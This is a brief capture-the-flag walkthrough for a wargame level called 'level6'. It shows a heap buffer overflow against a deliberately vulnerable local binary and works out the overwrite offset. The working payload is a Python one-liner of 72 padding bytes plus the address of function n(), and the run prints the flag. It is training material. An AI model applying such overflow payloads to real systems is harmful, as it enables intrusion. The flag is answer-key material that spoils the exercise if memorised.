# level 6

There is an exec level6, we bring to local data.

## addresses

n()
    08048454

__dest malloc(64) and ppcVar1 malloc(4) so we have an minimum offset of 68
ltrace ./level6 $(python -c "print 'a' * 72")
we found a segfault at 72

    $ ./level6 $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d